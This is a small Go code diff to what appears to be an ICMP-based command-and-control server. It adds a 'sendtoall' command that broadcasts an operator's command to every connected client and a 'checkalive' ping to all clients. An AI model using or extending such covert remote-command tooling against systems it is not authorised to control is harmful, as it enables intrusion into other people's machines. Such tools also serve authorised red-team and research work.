@@ -187,7 +187,6 @@ func send_packets(addr string, c icmp.PacketConn) {
 }
 
 func sendmessage(command string, clientid int, c icmp.PacketConn) {
-	command = strings.TrimRight(command, "\r\n")
 	execute = false
 	ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 	generate_packet(command, 0)
@@ -199,8 +198,7 @@ func sendmessage(command string, clientid int, c icmp.PacketConn) {
 
 func sendtoall(message string, c icmp.PacketConn) {
 	for k := range clients {
-		generate_packet(message, 0)
-		send_packets(clients[k], c)
+		sendmessage(message, k, c)
 	}
 }
 
@@ -372,7 +370,9 @@ func main() {
 			}
 
 		} else if strings.HasPrefix(input, "sendtoall") {
-			// sendtoall()
+			_, command, _ := strings.Cut(input, " ")
+			command = strings.TrimRight(command, "\r\n")
+			sendtoall(command, *c)
 
 		} else if strings.HasPrefix(input, "exe") {
 
@@ -392,6 +392,10 @@ func main() {
 				fmt.Println("Invalid Client")
 				continue
 			}
+
+		} else if strings.HasPrefix(input, "checkalive") {
+			sendtoall("ping", *c)
+
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
 
